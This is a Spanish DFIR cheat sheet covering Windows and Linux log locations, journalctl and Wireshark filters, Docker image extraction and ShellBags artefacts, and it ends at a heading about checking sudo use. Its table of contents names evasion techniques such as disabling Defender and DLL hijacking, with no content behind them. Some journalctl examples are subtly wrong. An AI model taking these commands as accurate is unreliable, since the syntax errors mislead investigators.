<h1 align="center">
  <img src="dfir-logo.png" alt="DFIR & Detection Engineering" width="470">
  <br>
  Digital Forensics Incident Response & Detection Engineering
</h1>

Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense y detección de técnicas utilizadas por actores maliciosos para la evasión de sistemas de protección y monitorización.

# Índice

- [🔍 Análisis forense y artefactos](#-anlisis-forense-y-artefactos)
    - [▶️ Logs de eventos de Windows](#-logs-de-eventos-de-windows)
    - [▶️ Logs de registros sobre instalaciones de Windows](#-logs-de-registros-sobre-instalaciones-de-windows)
    - [▶️ Logs del sistema de Linux](#-logs-del-sistema-de-linux)
    - [▶️ Logs de aplicaciones de Linux](#-logs-de-aplicaciones-de-linux)
    - [▶️ Logs journalctl (systemd)](#-logs-journalctl-systemd)
    - [▶️ Artefactos de conexiones de clientes VPN](#-artefactos-de-conexiones-de-clientes-vpn)
    - [▶️ Persistencia en servicios](#-persistencia-en-servicios)
    - [▶️ ¿Han eliminado el registro de eventos de Windows?](#-han-eliminado-el-registro-de-eventos-de-windows)
    - [▶️ Volatility: clipboard](#-volatility-clipboard)
    - [▶️ Obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)](#-obtener-archivos-con-pid-de-procesos-maliciosos-conexiones-ssh-linux)
    - [▶️ Filtros Wireshark para analistas](#-filtros-wireshark-para-analistas)
    - [▶️ Análisis Forense en contenedores Docker](#-anlisis-forense-en-contenedores-docker)
    - [▶️ Análisis y artefactos de ShellBags](#-anlisis-y-artefactos-de-shellbags)
    - [▶️ Thumbcache Viewer](#-thumbcache-viewer)
    - [▶️ Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp](#-forense-android-evidencias-de-imgenes-eliminadas-y-enviadas-por-whatsapp)
    - [▶️ Comprobar si un usuario ejecutó el comando "sudo"](#-comprobar-si-un-usuario-ejecut-el-comando-sudo)
    - [▶️ Artefactos en dispositivos USB (Windows, Linux y MacOS)](#-artefactos-en-dispositivos-usb-windows-linux-y-macos)
    - [▶️ Análisis Forense de logs en AnyDesk, Team Viewer y LogMeIn](#-anlisis-forense-de-logs-en-anydesk-team-viewer-y-logmein)
    - [▶️ Conocer la URL de descarga de un archivo (Zone.Identifier)](#-conocer-la-url-de-descarga-de-un-archivo-zoneidentifier)
    - [▶️ Artefactos forense - MS Word](#-artefactos-forense---ms-word)
    - [▶️ Analizar malware en fichero XLSX (MS Excel)](#-analizar-malware-en-fichero-xlsx-ms-excel)
    - [▶️ Asignación de IPs en equipos](#-asignacin-de-ips-en-equipos)
    - [▶️ Windows Firewall (wf.msc): Reglas residuales de software desintalado](#-windows-firewall-wfmsc-reglas-residuales-de-software-desintalado)
    - [▶️ Persistencia: suplantación de procesos del sistema](#-persistencia-suplantacin-de-procesos-del-sistema)
    - [▶️ Detectar malware Linux fileless (memfd)](#-detectar-malware-linux-fileless-memfd)
    - [▶️ SANS - Posters & Cheat Sheets (DFIR)](#-sans---posters--cheat-sheets-dfir)
- [📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense](#-deteccin-de-tcnicas-de-evasin-en-sistemas-siem-soc-y-anti-forense)
    - [▶️ Comando Windows: net y net1](#-comando-windows-net-y-net1)
    - [▶️ *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria](#-debugfs-para-eludir-alertas-al-ejecutar-comandos-o-acceder-a-ficheros-con-auditoria)
    - [▶️ WAF Bypass (SSRF): usar acortamiento IP local](#-waf-bypass-ssrf-usar-acortamiento-ip-local)
    - [▶️ Post-Explotación - PrivEsc con scmanager](#-post-explotacin---privesc-con-scmanager)
    - [▶️ Comando history](#-comando-history)
    - [▶️ Deshabilitar el uso del historial en la Shell](#-deshabilitar-el-uso-del-historial-en-la-shell)
    - [▶️ DLL Hijacking *cscapi.dll*](#-dll-hijacking-cscapidll)
    - [▶️ Otra técnica de ejecución de CMD o PowerShell](#-otra-tcnica-de-ejecucin-de-cmd-o-powershell)
    - [▶️ Uso de *type* para descargar o subir ficheros](#-uso-de-type-para-descargar-o-subir-ficheros)
    - [▶️ Forensia (Anti-Forensic)](#-forensia-anti-forensic)
    - [▶️ Bloquear conexiones USB: Rubber Ducky y Cactus WHID](#-bloquear-conexiones-usb-rubber-ducky-y-cactus-whid)
    - [▶️ Claves de registro de Windows donde se almacenan las contraseñas](#-claves-de-registro-de-windows-donde-se-almacenan-las-contraseas)
    - [▶️ WDigest Authentication: Habilitado / Deshabilitado](#-wdigest-authentication-habilitado--deshabilitado)
    - [▶️ Detectar si un sistema es una máquina virtual con PowerShell o WMIC](#-detectar-si-un-sistema-es-una-mquina-virtual-con-powershell-o-wmic)
    - [▶️ Técnicas de ofuscación en la ejecucación de comandos en Windows](#-tcnicas-de-ofuscacin-en-la-ejecucacin-de-comandos-en-windows)
    - [▶️ Detectar acciones de AutoRun al abrir una Command Prompt (cmd)](#-detectar-acciones-de-autorun-al-abrir-una-command-prompt-cmd)
    - [▶️ Extensiones ejecutables alternativas a .exe](#-extensiones-ejecutables-alternativas-a-exe)
    - [▶️ Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (tipo de flujo NTFS en directorios $INDEX_ALLOCATION)](#-detectar-malware-que-se-est-ejecutando-desde-una-carpeta-que-no-permite-su-acceso-por-error-de-ubicacin-tipo-de-flujo-ntfs-en-directorios-index_allocation)
    - [▶️ Auditoría en el uso privilegiado de los siguientes comandos](#-auditora-en-el-uso-privilegiado-de-los-siguientes-comandos)
    - [▶️ Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)](#-deshabilitar-windows-defender-para-eludir-la-deteccin-de-amsi-en-la-ejecucin-de-binarios-maliciosos-renombrar-msmpengexe-a-travs-del-registro-controlset00x)

---

# 🔍 Análisis forense y artefactos

### ▶️ Logs de eventos de Windows

| File Path | Info | Evidencias |
|-----------|------|------------|
| `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |

### ▶️ Logs de registros sobre instalaciones de Windows

| File Path | Info | Evidencias |
|-----------|------|------------|
| `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |
| `%WINDIR%\setupact.log` | Contiene información acerca de las acciones de instalación durante la misma | Podemos ver fechas de instalación, propiedades de programas instalados, rutas de acceso, copias legales, discos de instalación |
| `%WINDIR%\setuperr.log` | Contiene información acerca de los errores de instalación durante la misma | Fallos de programas, rutas de red inaccesibles, rutas a volcados de memoria |
| `%WINDIR%\WindowsUpdate.log` | Registra toda la información de transacción sobre la actualización del sistema y aplicaciones | Tipos de hotfix instalados, fechas de instalación, elementos por actualizar |
| `%WINDIR%\Debug\mrt.log` | Resultados del programa de eliminación de software malintencionado de Windows | Fechas, Versión del motor, firmas y resumen de actividad |
| `%WINDIR%\security\logs\scecomp.old` | Componentes de Windows que no han podido ser instalados | DLL's no registradas, fechas, intentos de escritura,rutas de acceso |
| `%WINDIR%\SoftwareDistribution\ReportingEvents.log` | Contiene eventos relacionados con la actualización | Agentes de instalación, descargas incompletas o finalizadas, fechas, tipos de paquetes, rutas |
| `%WINDIR%\Logs\CBS\CBS.log` | Ficheros pertenecientes a ‘Windows Resource Protection’ y que no se han podido restaurar | Proveedor de almacenamiento, PID de procesos, fechas, rutas |
| `%AppData%\Local\Microsoft\Websetup` (Windows 8) | Contiene detalles de la fase de instalación web de Windows 8 | URLs de acceso, fases de instalación, fechas de creación, paquetes de programas |
| `%AppData%\setupapi.log` | Contiene información de unidades, services pack y hotfixes | Unidades locales y extraibles, programas de instalación, programas instalados, actualizaciones de seguridad, reconocimiento de dispositivos conectados |
| `%WINDIR%\INF\setupapi.dev.log` | Contiene información de unidades Plug and Play y la instalación de drivers | Versión de SO, Kernel, Service Pack, arquitectura, modo de inicio, fechas, rutas, lista de drivers, dispositivos conectados, dispositivos iniciados o parados |
| `%WINDIR%\INF\setupapi.app.log` | Contiene información del registro de instalación de las aplicaciones | Fechas, rutas, sistema operativo, versiones, ficheros, firma digital, dispositivos |
| `%WINDIR%\Performance\Winsat\winsat.log` | Contiene registros de utilización de la aplicación WINSAT que miden el rendimiento del sistema | Fechas, valores sobre la tarjeta gráfica, CPU, velocidades, puertos USB |
| `%ProgramData%\Microsoft\Windows Defender\Support` | Contiene pruebas históricas de WD (Windows Defender). Los nombres de los archivos serán- MPLog-\*.log, MPDetection-\*.log, MPDeviceControl-\*.log | Fechas, versiones productos, servicios, notificaciones, CPU, ProcessImageName, EstimatedImpact, binarios, etc. |
| `%ProgramData%\Microsoft\Windows Defender\Scans\Scans\History` | Cuando se detecta una amenaza, WD almacena un archivo binario "DetectionHistory" | Se pueden analizar estos archivos utilizando herramientas como DHParser |

### ▶️ Logs del sistema de Linux

Estos ficheros de logs pueden variar, existir o no dependiendo del tipo de distribución del sistema Linux.

| File Path | Info |
|-----------|------|
| `/var/log/syslog` | Contiene la totalidad de logs capturados por rsyslogd. Los mensajes globales del sistema incluyendo registros que generan algunos servicios durante el arranque, registros que dejan los programas que se ejecutan por parte del demonio CROND, logs sobre procesos de autenticación llevados a cabo por los usuarios, etc. |
| `/var/log/auth.log` (Debian y derivados) ; `/var/log/secure` (Red Hat y derivados) | Almacena los eventos relacionados con mecanismos de autenticación, por ejemplo, cuando un usuario inicia sesión en el sistema, cambios en contraseñas, relacionados con sudo. |
| `var/log/debug` |	Registra datos de los programas que están actuando en modo depuración. De esta forma los programadores pueden obtener información si sus programas están funcionando adecuadamente. |
| `/var/log/kern.log` | Este fichero almacena los logs producidos por el kernel. Puede ser útil para intentar detectar y solucionar problemas con la detección de hardware. |
| `/var/log/dmesg` | Registra información relacionada con el hardware del equipo. Contiene información para concluir si el hardware funciona de forma adecuada. |
| `/var/log/dpkg.log` | En sistemas basados en Debian se genera este fichero cuando se instala o desinstala software utilizando DPKG. Contiene los registros y eventos producidos durante el proceso de instalación. |
| `/var/log/messages` | Contiene mensajes informativos y no críticos de la actividad del sistema operativo. Acostumbra a contener los errores que se registran en el arranque del sistema que no estén relacionados con el Kernel. Por lo tanto, si no se inicia un servicio, como por ejemplo el servidor de sonido, podemos buscar información dentro de este archivo. |
| `/var/log/faillog` | Registra los intentos fallidos de autenticación de cada usuario. Dentro del archivo se almacena una lista de usuarios, los fallos totales de cada usuario, el número de fallo máximos que permitimos y la fecha y hora del último fallo. Si un usuario supera el número de fallos máximos establecidos se deshabilitará el usuario por el tiempo que nosotros fijemos. |
| `/var/log/user.log` | Incluye información sobre los eventos producidos en las sesiones de los usuarios, dichos eventos incluyen errores, conexiones e interfaces de red que se encuentran activas. |
| `/var/log/lastlog` | Ayuda a ver la fecha y la hora en que cada usuario se ha conectado por última vez. |
| `/var/log/btmp` | Este fichero incluye registros sobre los intentos de autenticación fallido en el sistema. Almacena los intentos fallidos de logins en un equipo. Si alguien realizará un ataque de fuerza bruta a un servidor ssh, el fichero registraría la IP del atacante, el día y hora en que ha fallado el login, el nombre de usuario con que se ha intentado loguear, etc. Para visualizar este fichero usar utmpdump: "utmpdump /var/log/btmp"|
| `/var/log/wtmp` | Contiene información sobre qué usuarios se encuentran autenticados y usando el sistema actualmente. Equivalente al comando "last"|
| `/var/run/utmp` | Ver los usuarios que actualmente están logueados en un equipo. |
| `/var/log/boot.log` | Información relacionada con el arranque del sistema. Podemos consultarlo para analizar si se levantan los servicios del sistema, si se levanta la red, si se montan las unidades de almacenamiento, para averiguar un problema que hace que nuestro equipo no inicie, etc. |
| `/var/log/cron` | Se trata de un fichero de logs en donde se guardan los registros producidas por las tareas programadas ejecutadas por el demonio CROND. |
| `/var/log/daemon.log`	| Registra la actividad de los demonios o programas que corren en segundo plano. Para ver si un demonio se levanto o está dando errores podemos consultar este log. Dentro de daemon.log encontraremos información sobre el demonio que inicia el gestor de inicio, el demonio que inicia la base de datos de MySQL, etc. |
| `/var/log/apt/history.log` | Detalle de los paquetes instalados, desinstalados o actualizados mediante el gestor de paquetes apt. |
| `/var/log/apt/term.log` | Contiene la totalidad de información mostrada en la terminal en el momento de instalar, actualizar o desinstalar un paquete con apt. |
| `/var/log/mail.log` |	Información relacionada con el servidor de email que tengamos instalado en el equipo. En mi caso uso sendmail y registra la totalidad de sus acciones en mail.log. |
| `/var/log/alternatives.log` | Registra todas las operaciones relacionadas con el sistema de alternativas. Por lo tanto, todas las acciones que realicemos usando el comando update-alternatives se registrarán en este log. El sistema de alternativas permite definir nuestro editor de texto predeterminado, el entorno de escritorio predeterminado, la versión de java que queremos usar por defecto, etc. |
| `/var/log/Xorg.0.log` | Registra la totalidad de eventos relacionados con nuestra tarjeta gráfica desde que arrancamos el ordenador hasta que lo apagamos. Por lo tanto puede ayudar a detectar problemas con nuestra tarjeta gráfica. |

### ▶️ Logs de aplicaciones de Linux

| File Path | Info |
|-----------|------|
| `/var/log/mysqld.log` | Registra eventos y mensajes relacionados con el sistema de gestión de bases de datos MySQL. Contiene información sobre el inicio y apagado del servidor MySQL, consultas ejecutadas, errores y advertencias, así como cualquier actividad relevante en la base de datos. |
| `/var/log/rkhunter.log` | Registra la totalidad de resultados obtenidos por rkhunter. |
| `/var/log/samba/*.*` | Dentro de la ubicación "/var/log/samba" se encuentran distintos logs que registrarán los eventos que han ocurrido en nuestro servidor samba. Algunos de los registros que encontrarán son sobre creaciones de directorios, renombrado de archivos, ficheros creados y borrados, registros de conexiones y desconexiones al servidor, etc. |
| `/var/log/cups/*.*` | **"error_log"**, **"page_log"** y **"access_log"** contienen información acerca las horas en que una IP se ha conectado al servidor, el usuario que se ha conectado al servidor, los errores y advertencias del servidor, la fecha en que se ha imprimido un determinado documento, el número de copias, etc. |
| `/var/log/lighttpd/*.*` | **"access.log"** y **"error.log"** contienen información sobre las visitas y errores que se generan cuando un usuario visita una página web montada sobre un servidor lighttpd. |
| `/var/log/apache2/access.log` o `/var/log/httpd/access_log` | Contiene información de los usuarios que han accedido al servidor web Apache. En este fichero se encuentran datos como las webs que se han visitado desde una determinada IP, la hora en que una IP nos ha visitado, etc. |
| `/var/log/apache2/error.log` o `/var/log/httpd/error_log` | Registra la totalidad de errores cuando se procesan las solicitudes de los visitantes al servidor web Apache. |
| `/var/log/nginx/access.log` `/var/log/nginx/error.log` | **"access.log":** Registra las solicitudes al servidor Nginx, incluyendo detalles sobre la solicitud, dirección IP y código de respuesta HTTP, user-agent del cliente y más. **"error.log":** Registra los errores en el servidor Nginx, como problemas de configuración, errores de conexión y otros fallos técnicos. |
| `/var/log/prelink/` |	Contiene información sobre las modificaciones que la utilidad prelink realiza a los binarios y librerías compartidas. |
| `/var/log/mysql/mysql.log` | Registra la totalidad de sentencias que los clientes envían al servidor. |
| `/var/log/mysql/error.log` | Registra los errores o problemas detectados al iniciar, ejecutar o parar el servicio. Por lo tanto en el caso que MySQL o MariaDB no se inicien deberemos acceder a este fichero para obtener información del problema. |
| `/var/log/mysql/mysql-slow.log` |	Encontraremos información acerca de las sentencias que han tardado más segundos que los especificados en la variable del sistema long_query_time. De esta forma podremos conocer la sentencias SQL que se ejecutan de forma lenta. |
| `/var/log/fail2ban.log` | Registra el timestamp en el que una determinada IP ha sido bloqueada y desbloqueada al intentar acceder a un determinado servicio, normalmente SSH. |
| `/var/log/openvpn.log` | La hora en la que una determinada IP se ha conectado al servidor OpenVPN. Aunque para registrar los intentos fallidos de autenticación también se podría hacer uso de fail2ban. |
| `/var/log/openvpn-status.log` | Contiene información de los usuarios conectados al servidor OpenVPN. Ejemplos de la información que contiene es la IP de cada uno de los usuarios, la cuenta de usuario con que se ha conectado una determinada IP, la hora en que cada usuario ha iniciado la conexión, etc. |
| `/var/log/letsencrypt/letsencrypt.log` | Contiene todo tipo de información acerca de los certificados de Let's Encrypt. Por ejemplo si se han producido errores en la renovación de los certificados. |

### ▶️ Logs journalctl (systemd)
**Systemd**: es un sistema moderno en Linux que reemplaza a SysV init, mejorando la eficiencia del inicio y administración de servicios. SysV representa tanto al sistema operativo Unix System V como a un estilo de inicio basado en scripts de inicialización tradicionales, "init.d" gestiona servicios en sistemas con este enfoque. Systemd introduce herramientas como "journalctl", permitiendo acceder y analizar eficientemente registros estructurados del sistema.

**Journalctl**: es una herramienta en Linux que trabaja con el registro de systemd, brindando acceso a registros estructurados en el Journal de systemd. Facilita consultas y análisis avanzados de eventos del sistema mediante registros binarios estructurados, en contraste con los registros de texto plano tradicionales.

- Configurar la hora del sistema para visualizar los registros en hora UTC o local systemd mostrará los resultados en hora local de manera predeterminada.
```bash
timedatectl list-timezones
timedatectl set-timezone <zone>
timedatectl status
```

- Filtrar por prioridad.
```bash
Journalctl -p <n>
# 0: emerg
# 1: alert
# 2: crit
# 3: err
# 4: warning
# 5: notice
# 6: info
# 7: debug
```

- Filtrar por fecha/hora y rangos.
```bash
journalctl --since "YYYY-MM-DD"
journalctl --since "YYYY-MM-DD HH:MM:SS"
journalctl --since "-5 day"
journalctl --until "YYYY-MM-DD"
journalctl --since "YYYY-MM-DD HH:MM:SS" --until "YYYY-MM-DD HH:MM:SS"
```

- Mostrar las 20 entradas más recientes.
```bash
journalctl -n 20
```

- Hacer un seguimiento de los registros a tiempo real (equivalente a tail -f).
```bash
journalctl -f # Equivalente a "journalctl" y después presionar "Shift+F".
```

- Mostrar la lista de todos los boots que existen en el sistema.
```bash
journalctl --list-boots
```

- Mostrar resgistros de kernel.
```bash
journalctl -k
```

- Mostrar los registros de la sesión de inicio anterior para rastrear eventos previos al reinicio del sistema.
```bash
journalctl -b -1
```

- Mostrar los servicios que son dependientes del systemd.
```bash
systemctl list-units -t service --all
```

- Filtrar por servicios.
```bash
journalctl -u sshd.service
journalctl -u sshd.service -u dbus.service
journalctl -u sshd.service --since today
```

- Cambiar el formato en los resultados de salida.
```bash
journalctl -b -u nginx -o json
journalctl -b -u nginx -o json-pretty
journalctl -b -u nginx -o short # Resultado similar a un estilo syslog.
```

- Filtrar por proceso, usuario, grupo o servicio.
```bash
journalctl _PID=<identificador>
journalctl _UID=<identificador>
journalctl _GID=<identificador>
journalctl _COMM=<servicio>
# Para filtrar resultados del día actual: --since today
```

- Mostrar registros de los discos.
```bash
journalctl /dev/sda
```

- Mostrar un resultado de salida estándar.
```bash
journalctl --no-pager
```

- Eliminar y guardar registros antiguos.
```bash
# Eliminar entradas antiguas hasta que el espacio total del diario ocupe lo solicitado.
sudo journalctl --vacuum-size=1G

# Guardar las entradas del último año.
sudo journalctl --vacuum-time=1years
```

- Analizar eventos de inicio y apagado del sistema.
```bash
journalctl _SYSTEMD_UNIT=systemd-logind.service
```

- Mostrar eventos de modificación de archivos relacionados con su eliminación (rm).
```bash
journalctl /usr/bin/rm
```

- Buscar intentos de elevación de privilegios.
```bash
journalctl | grep "sudo"
```

- Mostrar eventos de modificación de archivos de registro.
```bash
journalctl /var/log/audit/audit.log
journalctl /usr/bin/journalctl
```

- Buscar eventos de ejecución de programas en directorios temporales.
```bash
journalctl _COMM="mv" OR _COMM="cp" | grep "/tmp/"
```

- Analizar cambios en archivos de configuración de servicios.
```bash
journalctl /etc/nginx/nginx.conf
```

- Mostrar cambios en archivos de configuración.
```bash
journalctl /usr/bin/vi
journalctl /usr/bin/vim
journalctl /usr/bin/nano
```

- Filtrar por eventos de inicio de sesión fallidos en SSH.
```bash
journalctl _SYSTEMD_UNIT=sshd.service | grep "Failed password"
```

- Mostrar eventos de inicio de sesión de usuarios remotos.
```bash
journalctl _SYSTEMD_UNIT=sshd.service | grep "Accepted"
```

Buscar eventos de ejecución de comandos de shell.
```bash
journalctl _COMM="bash" OR _COMM="sh"
```

Mostrar eventos de montaje y desmontaje de dispositivos.
```bash
journalctl _COMM="mount" OR _COMM="umount"
```

Mostrar eventos de cambios de permisos en archivos.
```bash
journalctl _COMM="chmod" OR _COMM="chown"
```

- Mostrar eventos de inicio de sesión exitosos.
```bash
journalctl SYSLOG_FACILITY=4
```

- Mostrar cambios en cronjobs.
```bash
journalctl /usr/sbin/cron
```

### ▶️ Artefactos de conexiones de clientes VPN

Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC comprometido por un actor malicioso.

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
```

### ▶️ Persistencia en servicios

Rama del registro donde se almacenan los valores de imagen de un controlador en un servicio. Usado a veces para mantener persistencia en el sistema.

Analizar ruta y parámetros del valor *"ImagePath"*.
```
HKLM\SYSTEM\CurrentControlSet\Services
```

### ▶️ ¿Han eliminado el registro de eventos de Windows?

¿Los atacantes eliminaron todos los registros de eventos de Windows?

VSS (Volume Shadow Copy) podría ser una opción pero hay escenarios donde esto también fue eliminado de forma intencionada.

1. Volcado de memoria: https://www.volatilityfoundation.org/releases
2. Montar con MemProcFS: https://github.com/ufrisk/MemProcFS
3. Copiar los archivos evtx:

```ps
Get-ChildItem -Path F:\pid\ -Include *.evtx -Recurse | Copy-Item -Destination .\evtx_files
```

- Volatility - Referencia evtlogs: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#evtlogs

### ▶️ Volatility: clipboard

Desde un volcado de memoria, los datos del portapapeles pueden se interesantes para revelar información.
```
volatility.exe -f memdump.bin --profile=Win10x64_10586 clipboard
```
- Referencia: https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf

### ▶️ Obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)

Se conectaron al sistema a través de SSH e iniciaron procesos maliciosos. Incluso, si eliminaron el historial de comandos.

Esta es una forma de obtener archivos con PID de procesos maliciosos (similar a casos de notty SSH) 

```bash
grep -l SSH_C /proc/*/environ
```

### ▶️ Filtros Wireshark para analistas

- Referencia Wireshark: https://www.wireshark.org/docs/dfref
- Brim Zed (herramienta que simplifica el análisis de datos superestructurados .pcapng): https://www.brimdata.io/download

- Filtrar por dirección IP. Donde "x.x.x.x" es la dirección IP que desea filtrar.
```
ip.addr == x.x.x.x
```

- Filtrar por rango de direcciones IP. Donde "x.x.x.x" e "y.y.y.y" son las direcciones IP inicial y final del rango.
```
ip.addr >= x.x.x.x and ip.addr <= y.y.y.y
```

- Filtrar por interfaz de red. Mostrar sólo los paquetes capturados en la interfaz eth0.
```
interface == eth0
```

- Filtrar por puerto. Donde "80" y "53" son los números de puerto que desees filtrar.
```
tcp.port == 80
udp.port == 53
```

- Filtrar por longitud del paquete. Mostrar sólo los paquetes de más de 100 bytes.
```
frame.len > 100
```

- Filtrar por dirección MAC de origen o destino. Donde "xx:xx:xx:xx:xx:xx" es la dirección MAC origen y destino que desees filtrar.
```
eth.src == xx:xx:xx:xx:xx:xx
eth.dst == xx:xx:xx:xx:xx:xx
```

- Filtrar por método HTTP. Mostrar sólo los paquetes con método GET. Puede sustituir GET por otros métodos HTTP como POST, PUT, DELETE, etc.
```
http.request.method == GET
http.request.method == POST && frame contains "login"
```

- Filtrar por códigos de estado HTTP.
```
# Respuestas Ok.
http.response.code == 200

# Respuestas de redireccionamiento. 301 redirección permanente y 302 redirección temporal.
http.response.code == 301 or http.response.code == 302

# Respuestas de error "Not Found". 
http.response.code == 404
```

- Filtrar por URI HTTP. Mostrar sólo los paquetes que tienen un URI que contiene "domain.com". Puede sustituir "domain.com" por cualquier otra cadena URI.
```
http.request.uri contains 'domain.com'
```

- Filtrar por cookie HTTP. Mostrar sólo los paquetes que contienen una cookie con el nombre "sessionid".
```
http.cookie contains 'sessionid'
```

- Filtrar por tamaño de paquete. Mostrar sólo los paquetes de más de 1000 bytes.
```
frame.len > 1000
```

- Filtros DNS.
```
# Paquetes DNS que tengan un nombre de dominio que contenga "domain.com"
dns.qry.name contains 'domain.com'
dns.resp.name == domain.com 

# Consulta/respuesta de puntero DNS (PTR, DNS Inverso)
dns.qry.type == 12

# Consultas MX
dns.qry.type == 15

# Solo consultas DNS.
dns.flags.response == 0

# Solo consultas de respuesta DNS.
dns.flags.response eq 1 # only DNS response queries

# Errores DNS.
dns.flags.rcode != 0 or (dns.flags.response eq 1 and dns.qry.type eq 28 and !dns.aaaa)

# NXDominio no existente.
dns.flags.rcode == 3

# No Error, nslookup microsoft.com 193.247.121.196.
((dns.flags.rcode == 3) && !(dns.qry.name contains ".local") && !(dns.qry.name contains ".svc") && !(dns.qry.name contains ".cluster"))
(dns.flags.rcode == 0) && (dns.qry.name == "microsoft.com")

dns.flags.rcode != 0 or (dns.flags.response eq 1 and dns.qry.type eq 28 and !dns.aaaa)
```

- Filtros TLS.
```
# TLS handshake.
tls.record.content_type == 22

# Filtrar por tipo de handshake SSL/TLS.
ssl.handshake.type = TLS
ssl.handshake.type = SSL

# Paquetes "TLS Client Hello".
tls.handshake.type == 1

# Paquetes "TLS Server Hello".
tls.handshake.type == 2

# Conexión cerrada.
tls.record.content_type == 21

# Paquetes relacionados con la comunicación entre el cliente y el servidor que involucren el sitio web "badsite.com".
tls.handshake.extensions_server_name contains "badsite.com"

# Cuando se produce el timeout, el cliente suele enviar un RST al servidor para filtrar los paquetes con el timeout del handshake. 
(tcp.flags.reset eq 1) and (tcp.flags.ack eq 0)

# Paquetes que tardan en responder a SYNACK durante el handshake del servidor.
tcp.flags eq 0x012 && tcp.time_delta gt 0.0001
```

- Filtros GeoIP
```
# Excluir el tráfico procedente de Estados Unidos.
ip and not ip.geoip.country == "United States" 

# Ciudad de destino [IPv4].
ip.geoip.dst_city == "Dublin" 

# Ciudad de origen o destino [IPv4].
ip.geoip.city == "Dublin"
ip.geoip.dst_country == "Ireland"
ip.geoip.dst_country_iso == "IE"

# Todos los países de destino excepto Estados Unidos.
!ip.geoip.country == "United States" 
not ip.geoip.country == "United States"
```

- Establecer un filtro para los valores HEX de 0x22 0x34 0x46 en cualquier offset.
```
udp contains 22:34:46
```

- Filtrar por flags TCP. Mostrar sólo los paquetes con la bandera SYN activada. Puede sustituir SYN por cualquier otro indicador TCP, como ACK, RST, FIN, URG o PSH.
```
tcp.flags.syn == 1
```

- Mostrar todos los flags SYNACK TCP.
```
tcp.flags.syn == 1 && tcp.flags.ack == 1
```

- Mostrar paquetes con reconocimientos duplicados en TCP.
```
tcp.analysis.duplicate_ack
```

### ▶️ Análisis Forense en contenedores Docker 

Si un contenedor malicioso modifica archivos o acciones de malware al iniciarse, es posible que se pierdan muchos artefactos de seguridad. La solución podría ser trabajar con el contenedor que se crea pero que no se inicia.

Extraer el sistema de archivos de contenedores de Docker. 

- Referencia: https://iximiuz.com/en/posts/docker-image-to-filesystem

Ejemplo con una imagen oficial de nginx.

Opción 1: **`docker export`**
```bash
docker pull nginx
CONT_ID=$(docker run -d nginx)
docker export ${CONT_ID} -o nginx.tar.gz

mkdir rootfs
tar -xf nginx.tar.gz -C rootfs
ls -lathF rootfs
```

Opción 2: **`docker build`**
```bash
echo 'FROM nginx' > Dockerfile
DOCKER_BUILDKIT=1 docker build -o rootfs .
ls -lathF rootfs
```

Opción 3: **`crt (containerd CLI)`**

Montar imágenes de contenedores como carpetas locales del host.
```bash
ctr image pull docker.io/library/nginx:latest
mkdir rootfs
ctr image mount docker.io/library/nginx:latest rootfs
ls -lathF rootfs
```

### ▶️ Análisis y artefactos de ShellBags

Shellbags son un conjunto de claves de registro que contienen detalles sobre la carpeta vista de un usuario, como su tamaño, posición e icono. Proporcionan marcas de tiempo, información contextual y muestran el acceso a directorios y otros recursos, lo que podría apuntar a evidencia que alguna vez existió. 

Se crea una entrada de shellbag para cada carpeta recién explorada, indicaciones de actividad, actuando como un historial de qué elementos del directorio pueden haberse eliminado de un sistema desde entonces, o incluso evidenciar el acceso de dispositivos extraíbles donde están ya no adjunto.

El análisis de Shellbag puede exponer información sobre:

- Accesos a carpetas.

Por ejemplo, elementos de escritorio, categorías/elementos del panel de control, letra de unidad, directorios o incluso archivos comprimidos.

- Evidencia de eliminación, sobrescritura o cambio de nombre de carpeta.
- Patrones transversales y de navegación de directorios.

Esto también podría incluir evidencia de acceso remoto (RDP o VNC), así como la eliminación de archivos binarios o el acceso a recursos de red.

**Artefactos de las Shellbags**

`NTUSER.DAT`
```
HKCU\Software\Microsoft\Windows\Shell\Bags
HKCU\Software\Microsoft\Windows\Shell\BagMRU
```

`USRCLASS.DAT`
```
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags
```

Descripción de valores relevantes:

| Valor | Descripción |
|-------|-------------|
| `MRUListExt` | Valor de 4 bytes que indica el orden en el que se accedió por última vez a cada carpeta secundaria de la jerarquía BagMRU |
| `NodeSlot` | Contiene las preferencias de visualización y la configuración de shellbag |
| `NodeSlots` | Solo está en la clave raíz de BagMRU y se actualiza cada vez que se crea una nueva shellbag |

**Referencia detallada para la interpretación de ShellBags**

- https://www.4n6k.com/2013/12/shellbags-forensics-addressing.html

**Herramienta para explorar y análizar Shellbags tanto de forma online como offline**

-  **ShellBags Explorer** (GUI) o **SBECmd** (CLI): https://ericzimmerman.github.io/#!index.md

### ▶️ Thumbcache Viewer

Visualizar ficheros *"thumbcache_\*.db"*.

- https://thumbcacheviewer.github.io

### ▶️ Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp

Un usuario envió imágenes a través de Whatsapp, después las eliminó de su dispositivo móvil, pero estas imágenes todavía están en la carpeta "sent" de WhatsApp.

```
"Internal storage/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"
```

### ▶️ Comprobar si un usuario ejecutó el comando "sudo"

En un escenario en el que un posible atacante creó un nuevo usuario y eliminó el historial de comandos, pero aún no se puede confirmar si el atacante obtuvo privilegios de root ejecutando el comando "sudo".

